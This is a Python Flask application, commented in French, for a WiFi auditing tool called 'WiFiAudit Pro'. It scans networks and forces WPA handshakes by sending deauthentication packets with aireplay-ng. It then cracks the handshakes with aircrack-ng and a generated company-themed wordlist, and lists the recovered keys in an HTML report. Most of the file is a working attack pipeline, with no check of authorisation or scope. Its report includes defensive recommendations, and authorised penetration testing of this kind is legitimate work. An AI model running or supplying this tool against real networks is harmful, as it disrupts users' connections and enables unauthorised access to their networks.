#!/usr/bin/env python3
"""
app.py - WiFiAudit Pro : interface web locale
Lancer avec : sudo python3 app.py
Puis ouvrir  : http://localhost:5000
"""

import json
import os
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path

from flask import Flask, jsonify, render_template, request, send_file

app = Flask(__name__)

# ── Stockage en mémoire des jobs et de la session ──────────────────────────
JOBS: dict[str, dict] = {}
SESSION: dict = {}

CAPTURE_DIR = Path("/tmp/wifiaudit_captures")
REPORT_DIR  = Path("/tmp/wifiaudit_reports")
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
REPORT_DIR.mkdir(parents=True, exist_ok=True)


# ── Utilitaires ────────────────────────────────────────────────────────────

def new_job() -> str:
    jid = str(uuid.uuid4())[:8]
    JOBS[jid] = {"status": "running", "output": [], "result": None}
    return jid

def job_log(jid: str, line: str) -> None:
    JOBS[jid]["output"].append(line)

def job_done(jid: str, result=None) -> None:
    JOBS[jid]["status"] = "done"
    JOBS[jid]["result"] = result

def job_error(jid: str, msg: str) -> None:
    JOBS[jid]["status"] = "error"
    JOBS[jid]["output"].append(f"ERREUR : {msg}")

def run(cmd: list, timeout: int = 30) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

def detect_interfaces() -> list[str]:
    try:
        out = run(["iw", "dev"], timeout=5).stdout
        return [l.split()[1] for l in out.splitlines() if l.strip().startswith("Interface ")]
    except Exception:
        return []


# ── Routes principales ─────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/interfaces")
def api_interfaces():
    return jsonify(detect_interfaces())


@app.route("/api/scan", methods=["POST"])
def api_scan():
    data    = request.json or {}
    iface   = data.get("interface", "wlan0")
    jid     = new_job()

    def _scan():
        try:
            job_log(jid, f"Lancement du scan sur {iface}...")
            run(["nmcli", "dev", "wifi", "rescan", "ifname", iface], timeout=15)
            time.sleep(6)
            result = run(
                ["nmcli", "-f", "IN-USE,BSSID,SSID,MODE,CHAN,FREQ,RATE,SIGNAL,BARS,SECURITY",
                 "--terse", "dev", "wifi", "list", "ifname", iface],
                timeout=15,
            )
            networks = _parse_nmcli(result.stdout)
            job_log(jid, f"{len(networks)} réseau(x) trouvé(s).")
            SESSION["networks"] = networks
            job_done(jid, networks)
        except Exception as e:
            job_error(jid, str(e))

    threading.Thread(target=_scan, daemon=True).start()
    return jsonify({"job_id": jid})


def _parse_nmcli(raw: str) -> list[dict]:
    import re
    networks, seen = [], set()
    for line in raw.splitlines():
        parts = line.split(":")
        if len(parts) < 10:
            continue
        bssid = parts[1].strip()
        if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
            continue
        if bssid in seen:
            continue
        seen.add(bssid)
        try:
            signal = int(parts[7]) if parts[7].isdigit() else 0
        except Exception:
            signal = 0
        enc = parts[9].strip() or "OPEN"
        try:
            channel = int(parts[4]) if parts[4].isdigit() else 0
        except Exception:
            channel = 0

        risk = "CRITIQUE" if enc in ("", "OPEN", "WEP") else "ÉLEVÉ" if enc == "WPA" else "MOYEN"
        networks.append({
            "bssid":      bssid,
            "ssid":       parts[2].strip() or "<caché>",
            "channel":    channel,
            "signal":     signal,
            "encryption": enc,
            "risk":       risk,
        })
    networks.sort(key=lambda x: x["signal"], reverse=True)
    return networks


@app.route("/api/capture", methods=["POST"])
def api_capture():
    data    = request.json or {}
    iface   = data.get("interface", "wlan0")
    bssid   = data.get("bssid", "")
    channel = data.get("channel", 6)
    ssid    = data.get("ssid", "target")
    timeout = int(data.get("timeout", 90))
    jid     = new_job()

    def _capture():
        try:
            # Mode monitor
            job_log(jid, "Activation du mode monitor...")
            run(["airmon-ng", "check", "kill"], timeout=10)
            r = run(["airmon-ng", "start", iface], timeout=15)
            mon = iface + "mon"
            for line in r.stdout.splitlines():
                if "monitor mode" in line.lower() and "enabled" in line.lower():
                    for w in reversed(line.split()):
                        if w.startswith("wlan") or w.startswith("mon"):
                            mon = w.rstrip(")")
                            break
            job_log(jid, f"Interface monitor : {mon}")

            safe = "".join(c for c in ssid if c.isalnum() or c in "-_")[:16]
            prefix = str(CAPTURE_DIR / f"cap_{safe}_{int(time.time())}")
            cap_file = prefix + "-01.cap"

            # Démarrer airodump-ng
            job_log(jid, f"Capture sur {bssid} (canal {channel})...")
            proc = subprocess.Popen(
                ["airodump-ng", "--bssid", bssid, "--channel", str(channel),
                 "--write", prefix, "--output-format", "pcap", mon],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            time.sleep(4)

            # Deauth
            job_log(jid, "Envoi de paquets deauth pour forcer la reconnexion...")
            run(["aireplay-ng", "--deauth", "8", "-a", bssid, mon], timeout=20)

            # Attendre le handshake
            deadline = time.time() + timeout
            found = False
            while time.time() < deadline:
                if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
                    chk = run(["aircrack-ng", "-a", "2", "-b", bssid, cap_file], timeout=10)
                    if "1 handshake" in chk.stdout or "Handshake" in chk.stdout:
                        found = True
                        break
                time.sleep(3)

            proc.terminate()
            proc.wait(timeout=3)
            run(["airmon-ng", "stop", mon], timeout=10)
            run(["service", "NetworkManager", "start"], timeout=8)

            if found:
                job_log(jid, f"✓ Handshake capturé : {cap_file}")
                SESSION["last_cap"] = cap_file
                SESSION["last_bssid"] = bssid
                SESSION["last_ssid"] = ssid
                job_done(jid, {"cap_file": cap_file})
            else:
                job_error(jid, "Handshake non capturé. Assurez-vous qu'un client est connecté.")
        except Exception as e:
            job_error(jid, str(e))

    threading.Thread(target=_capture, daemon=True).start()
    return jsonify({"job_id": jid})


@app.route("/api/crack", methods=["POST"])
def api_crack():
    data     = request.json or {}
    cap_file = data.get("cap_file") or SESSION.get("last_cap", "")
    bssid    = data.get("bssid")    or SESSION.get("last_bssid", "")
    company  = data.get("company",  "")
    jid      = new_job()

    def _crack():
        try:
            if not cap_file or not os.path.exists(cap_file):
                job_error(jid, "Fichier .cap introuvable.")
                return

            # Générer une wordlist ciblée
            wl_path = str(CAPTURE_DIR / "targeted.txt")
            job_log(jid, f"Génération de la wordlist ciblée ({company or 'générique'})...")
            _generate_wordlist(wl_path, company)
            job_log(jid, "Lancement de aircrack-ng...")

            result = subprocess.run(
                ["aircrack-ng", "-a", "2", "-b", bssid, "-w", wl_path, cap_file],
                capture_output=True, text=True, timeout=300,
            )

            key = None
            for line in result.stdout.splitlines():
                if "KEY FOUND!" in line:
                    s, e = line.find("["), line.find("]")
                    if s != -1 and e != -1:
                        key = line[s+1:e].strip()

            if key:
                job_log(jid, f"✓ CLÉ TROUVÉE : {key}")
                SESSION.setdefault("cracked", []).append({
                    "ssid": SESSION.get("last_ssid", "?"),
                    "key": key,
                })
                job_done(jid, {"key": key})
            else:
                job_log(jid, "Clé non trouvée dans la wordlist ciblée.")
                job_done(jid, {"key": None})
        except subprocess.TimeoutExpired:
            job_error(jid, "Timeout — essayez avec une wordlist plus grande.")
        except Exception as e:
            job_error(jid, str(e))

    threading.Thread(target=_crack, daemon=True).start()
    return jsonify({"job_id": jid})


def _generate_wordlist(path: str, company: str) -> None:
    suffixes = ["2023","2024","2025","2026","123","1234","!","@2025","@2024"]
    bases = [
        "Password","Welcome","Admin","Wifi","Network","Internet",
        "Guest","Office","Company","Secure","Access","Connect",
    ]
    words = set()
    for b in bases:
        for s in [""] + suffixes:
            for w in [b+s, b.lower()+s, b.upper()+s]:
                if 8 <= len(w) <= 63:
                    words.add(w)
    if company:
        parts = company.split() + [company.replace(" ","")]
        for p in parts:
            for s in [""] + suffixes:
                for w in [p+s, p.lower()+s, p.capitalize()+s]:
                    if 8 <= len(w) <= 63:
                        words.add(w)
    with open(path, "w") as fh:
        fh.write("\n".join(sorted(words)))


@app.route("/api/report", methods=["POST"])
def api_report():
    data   = request.json or {}
    client = data.get("client", "Client")
    tester = data.get("tester", "Auditeur")
    scope  = data.get("scope",  "Réseau WiFi")

    networks = SESSION.get("networks", [])
    cracked  = SESSION.get("cracked",  [])

    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"rapport_wifi_{client.replace(' ','_')}_{ts}.html"
    path     = str(REPORT_DIR / filename)

    _build_html_report(path, client, tester, scope, networks, cracked)
    SESSION["last_report"] = path
    return jsonify({"filename": filename})


@app.route("/api/download_report")
def api_download_report():
    path = SESSION.get("last_report", "")
    if not path or not os.path.exists(path):
        return "Rapport non trouvé", 404
    return send_file(path, as_attachment=True)


@app.route("/api/job/<jid>")
def api_job(jid: str):
    job = JOBS.get(jid, {"status": "not_found", "output": [], "result": None})
    return jsonify(job)


# ── Génération du rapport HTML ─────────────────────────────────────────────

def _build_html_report(path, client, tester, scope, networks, cracked):
    risk_color = {"CRITIQUE":"#dc2626","ÉLEVÉ":"#ea580c","MOYEN":"#d97706","FAIBLE":"#16a34a"}

    net_rows = ""
    counts   = {"CRITIQUE": 0, "ÉLEVÉ": 0, "MOYEN": 0}
    for n in networks:
        r = n.get("risk","MOYEN")
        counts[r] = counts.get(r, 0) + 1
        rc = risk_color.get(r, "#64748b")
        net_rows += (
            f"<tr><td><b>{n['ssid']}</b></td><td style='font-family:monospace'>{n['bssid']}</td>"
            f"<td>{n['channel']}</td><td>{n['signal']}%</td>"
            f"<td>{n['encryption'] or 'OPEN'}</td>"
            f"<td style='color:{rc};font-weight:700'>{r}</td></tr>\n"
        )

    cred_section = ""
    if cracked:
        rows = "".join(
            f"<tr><td><b>{c['ssid']}</b></td>"
            f"<td style='font-family:monospace;color:#dc2626;font-size:1.2em'><b>{c['key']}</b></td></tr>"
            for c in cracked
        )
        cred_section = f"""
        <h2 style='color:#dc2626;margin-top:40px'>⚠ Identifiants récupérés</h2>
        <table><tr><th>Réseau</th><th>Mot de passe WiFi</th></tr>{rows}</table>"""

    html = f"""<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"/>
<title>Rapport WiFi — {client}</title>
<style>
body{{font-family:'Segoe UI',sans-serif;margin:0;background:#f8fafc;color:#1e293b}}
header{{background:#1e3a5f;color:white;padding:36px 60px;border-bottom:4px solid #dc2626}}
header h1{{margin:0 0 4px;font-size:1.8rem}}
.meta{{display:flex;gap:40px;margin-top:16px;flex-wrap:wrap}}
.meta div label{{display:block;color:#94a3b8;font-size:.75rem;text-transform:uppercase}}
.meta div span{{font-weight:700}}
.container{{max-width:1000px;margin:0 auto;padding:40px}}
h2{{color:#1e3a5f;border-left:4px solid #dc2626;padding-left:12px}}
.cards{{display:flex;gap:16px;margin:20px 0;flex-wrap:wrap}}
.card{{background:white;border:1px solid #e2e8f0;border-radius:8px;padding:20px 30px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.06)}}
.card .n{{font-size:2.5rem;font-weight:800}}
.card .l{{color:#64748b;font-size:.8rem;text-transform:uppercase}}
table{{width:100%;border-collapse:collapse;background:white;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.06)}}
th{{background:#1e3a5f;color:white;padding:10px 14px;text-align:left}}
td{{padding:10px 14px;border-bottom:1px solid #e2e8f0}}
tr:last-child td{{border:none}}
ul{{line-height:2.2}}
footer{{text-align:center;color:#94a3b8;font-size:.8rem;padding:30px;border-top:1px solid #e2e8f0;margin-top:40px}}
</style></head><body>
<header>
  <h1>Rapport d'Audit — Sécurité WiFi</h1>
  <div class="meta">
    <div><label>Client</label><span>{client}</span></div>
    <div><label>Auditeur</label><span>{tester}</span></div>
    <div><label>Périmètre</label><span>{scope}</span></div>
    <div><label>Date</label><span>{datetime.now().strftime('%d/%m/%Y %H:%M')}</span></div>
    <div><label>Statut</label><span style='color:#fbbf24'>CONFIDENTIEL</span></div>
  </div>
</header>
<div class="container">
  <h2>Résumé</h2>
  <div class="cards">
    <div class="card"><div class="n" style="color:#dc2626">{counts.get('CRITIQUE',0)}</div><div class="l">Critique</div></div>
    <div class="card"><div class="n" style="color:#ea580c">{counts.get('ÉLEVÉ',0)}</div><div class="l">Élevé</div></div>
    <div class="card"><div class="n" style="color:#d97706">{counts.get('MOYEN',0)}</div><div class="l">Moyen</div></div>
    <div class="card"><div class="n" style="color:#1e3a5f">{len(networks)}</div><div class="l">Réseaux détectés</div></div>
    <div class="card"><div class="n" style="color:#dc2626">{len(cracked)}</div><div class="l">Mots de passe récupérés</div></div>
  </div>

  <h2 style="margin-top:40px">Réseaux détectés</h2>
  <table>
    <tr><th>SSID</th><th>BSSID</th><th>Canal</th><th>Signal</th><th>Sécurité</th><th>Risque</th></tr>
    {net_rows or '<tr><td colspan="6" style="text-align:center;color:#94a3b8">Aucun réseau scanné</td></tr>'}
  </table>

  {cred_section}

  <h2 style="margin-top:40px">Recommandations</h2>
  <ul>
    <li>Migrer vers <b>WPA3-Personal</b> ou <b>WPA2-Enterprise (802.1X / RADIUS)</b></li>
    <li>Désactiver <b>WPS</b> sur tous les points d'accès</li>
    <li>Utiliser une passphrase <b>aléatoire de 15+ caractères</b> sans rapport avec l'entreprise</li>
    <li>Isoler le WiFi dans un <b>VLAN dédié</b>, séparé du réseau interne</li>
    <li>Activer <b>PMF (802.11w)</b> pour protéger les trames de gestion</li>
    <li>Déployer un <b>WIDS</b> pour détecter les attaques de désauthentification</li>
  </ul>
</div>
<footer>Document confidentiel — généré le {datetime.now().strftime('%d/%m/%Y à %H:%M')} — WiFiAudit Pro</footer>
</body></html>"""

    with open(path, "w", encoding="utf-8") as fh:
        fh.write(html)


# ── Lancement ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("⚠  Lance avec : sudo python3 app.py")
        sys.exit(1)
    print("\n  WiFiAudit Pro — interface web")
    print("  Ouvre ton navigateur sur : http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
